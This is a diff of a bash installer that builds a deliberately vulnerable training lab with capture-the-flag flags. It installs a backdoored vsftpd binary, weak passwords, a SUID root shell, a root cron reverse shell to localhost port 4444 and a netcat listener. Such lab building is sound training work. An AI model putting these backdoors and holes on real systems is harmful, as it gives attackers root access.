@@ -1,41 +1,39 @@
 #!/bin/bash
-# VulnLab Ultimate Installer
-# For Ubuntu 20.04/22.04 (Root required)
+# Vuln Lab Autoinstaller by EthicalHackerGPT
+# Tested on Ubuntu 20.04 / 22.04
 set -e
 
-echo "[+] Updating system & installing dependencies..."
+echo "[+] Installing dependencies..."
 apt update && apt install -y apache2 php php-mysqli mariadb-server git unzip curl vsftpd openssh-server \
-  nodejs npm netcat build-essential gcc g++ libcap2-bin
+    nodejs npm netcat gcc g++ build-essential libcap2-bin
 
-# --- MySQL Config ---
-echo "[+] Configuring MySQL..."
-service mysql start
-mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '';"
-mysql -e "FLUSH PRIVILEGES;"
-mysql -e "CREATE DATABASE dvwa;"
-mysql -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';"
-mysql -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"
+echo "[+] Starting MySQL service..."
+systemctl start mysql
 
-# --- Install DVWA ---
+echo "[+] Securing MySQL with default password..."
+MYSQL_ROOT_PW="rootpass"
+mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '${MYSQL_ROOT_PW}';"
+mysql -uroot -p${MYSQL_ROOT_PW} -e "FLUSH PRIVILEGES;"
+mysql -uroot -p${MYSQL_ROOT_PW} -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';"
+mysql -uroot -p${MYSQL_ROOT_PW} -e "CREATE DATABASE dvwa;"
+mysql -uroot -p${MYSQL_ROOT_PW} -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"
+
 echo "[+] Installing DVWA..."
 git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
 cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php
 sed -i "s/'root'/'dvwa'/; s/''/'p@ssw0rd'/" /var/www/html/dvwa/config/config.inc.php
 
-# --- Install bWAPP ---
 echo "[+] Installing bWAPP..."
 mkdir -p /var/www/html/bwapp
 wget https://sourceforge.net/projects/bwapp/files/latest/download -O /tmp/bwapp.zip
 unzip /tmp/bwapp.zip -d /var/www/html/bwapp
 mv /var/www/html/bwapp/bWAPP/* /var/www/html/bwapp/
-mysql -e "CREATE DATABASE bwapp;"
-mysql -e "GRANT ALL ON bwapp.* TO 'dvwa'@'localhost';"
+mysql -uroot -p${MYSQL_ROOT_PW} -e "CREATE DATABASE bwapp;"
+mysql -uroot -p${MYSQL_ROOT_PW} -e "GRANT ALL ON bwapp.* TO 'dvwa'@'localhost';"
 
-# --- Install Mutillidae ---
 echo "[+] Installing Mutillidae..."
 git clone https://github.com/webpwnized/mutillidae.git /var/www/html/mutillidae
 
-# --- Install Juice Shop ---
 echo "[+] Installing Juice Shop..."
 mkdir -p /opt/juice-shop
 cd /opt/juice-shop
@@ -43,8 +41,7 @@ git clone https://github.com/bkimminich/juice-shop.git .
 npm install
 nohup npm start &
 
-# --- Vulnerable FTP Server ---
-echo "[+] Setting up vsftpd backdoored..."
+echo "[+] Installing vsftpd 2.3.4 (backdoored)..."
 wget https://github.com/andresriancho/vsftpd-2.3.4-backdoor/raw/master/vsftpd-2.3.4 -O /usr/sbin/vsftpd
 chmod +x /usr/sbin/vsftpd
 cat <<EOF > /etc/vsftpd.conf
@@ -57,31 +54,25 @@ connect_from_port_20=YES
 EOF
 useradd -m ftpuser -s /bin/bash
 echo "ftpuser:12345" | chpasswd
-service vsftpd restart
+systemctl restart vsftpd || /usr/sbin/vsftpd &
 
-# --- SSH User with Weak Pass ---
 echo "[+] Adding weak SSH user..."
 useradd hacker -m -s /bin/bash
 echo "hacker:hackme" | chpasswd
 
-# --- SUID Binary ---
-echo "[+] Adding custom SUID shell..."
-echo -e '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0); system("/bin/bash"); return 0;}' > /tmp/rootshell.c
+echo "[+] Adding SUID root shell..."
+echo -e '#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0); system("/bin/bash"); return 0;}' > /tmp/rootshell.c
 gcc /tmp/rootshell.c -o /usr/local/bin/rootshell
 chmod 4755 /usr/local/bin/rootshell
 rm /tmp/rootshell.c
 
-# --- Cronjob Reverse Shell ---
-echo "[+] Setting cronjob reverse shell..."
+echo "[+] Creating cronjob reverse shell..."
 echo "* * * * * root bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" >> /etc/crontab
 
-# --- Flags Setup ---
 echo "[+] Creating flags..."
 mkdir -p /opt/flags /var/tmp/.hidden
-cat <<EOF > /opt/flags/flag1.txt
-FLAG{dvwa_root_pwned}
-EOF
 
+echo "FLAG{dvwa_root_pwned}" > /opt/flags/flag1.txt
 echo "FLAG{ftp_backdoor_triggered}" > /var/tmp/.hidden/ftp_flag.txt
 echo "FLAG{juice_shop_xss}" | base64 > /opt/flags/juice_flag.b64
 echo "FLAG{mysql_dump_success}" > /root/mysql_flag.txt
@@ -92,7 +83,6 @@ chmod 640 /var/tmp/.hidden/ftp_flag.txt
 chown root:root /opt/flags/*.txt /root/mysql_flag.txt
 chown ftpuser:ftpuser /var/tmp/.hidden/ftp_flag.txt
 
-# --- Scoreboard Logging Script ---
 echo "[+] Creating scoreboard logger..."
 mkdir -p /opt/scripts
 cat <<'EOF' > /opt/scripts/log_score.sh
@@ -101,23 +91,26 @@ echo "$(date) - FLAG found: $1 by user: $(whoami)" >> /var/log/scoreboard.log
 EOF
 chmod +x /opt/scripts/log_score.sh
 
-# --- Netcat Reverse Shell Listener ---
-echo "[+] Starting netcat reverse shell listener on port 4444..."
+echo "[+] Starting netcat listener on port 4444..."
 nohup nc -lvnp 4444 > /opt/reverse_shell.log 2>&1 &
 
-# --- Restart Web Services ---
+echo "[+] Restarting services..."
 systemctl restart apache2 mysql
 
-echo "[+] ALL SET!"
-echo "Apps:"
-echo " - DVWA:        http://<IP>/dvwa"
-echo " - bWAPP:       http://<IP>/bwapp"
-echo " - Mutillidae:  http://<IP>/mutillidae"
-echo " - Juice Shop:  http://<IP>:3000"
+echo ""
+echo "🎉 DONE! Vuln lab is ready to rock:"
+echo "  [1] DVWA        → http://<IP>/dvwa"
+echo "  [2] bWAPP       → http://<IP>/bwapp"
+echo "  [3] Mutillidae  → http://<IP>/mutillidae"
+echo "  [4] Juice Shop  → http://<IP>:3000"
+echo ""
 echo "Services:"
-echo " - SSH:         hacker/hackme"
-echo " - FTP:         ftpuser/12345"
-echo " - SUID Shell:  /usr/local/bin/rootshell"
-echo " - RevShell:    Listens on port 4444"
-echo " - Flags:       /opt/flags, /var/tmp/.hidden/, /root"
-echo " - Logger:      /opt/scripts/log_score.sh"
+echo "  [SSH]    user: hacker | pass: hackme"
+echo "  [FTP]    user: ftpuser | pass: 12345"
+echo "  [SUID]   /usr/local/bin/rootshell"
+echo "  [RevShell]  Port: 4444 (localhost only by default)"
+echo ""
+echo "Flags placed in:"
+echo "  /opt/flags, /var/tmp/.hidden/, /root"
+echo "Scoreboard logger: /opt/scripts/log_score.sh"
+echo "Happy Hacking!"
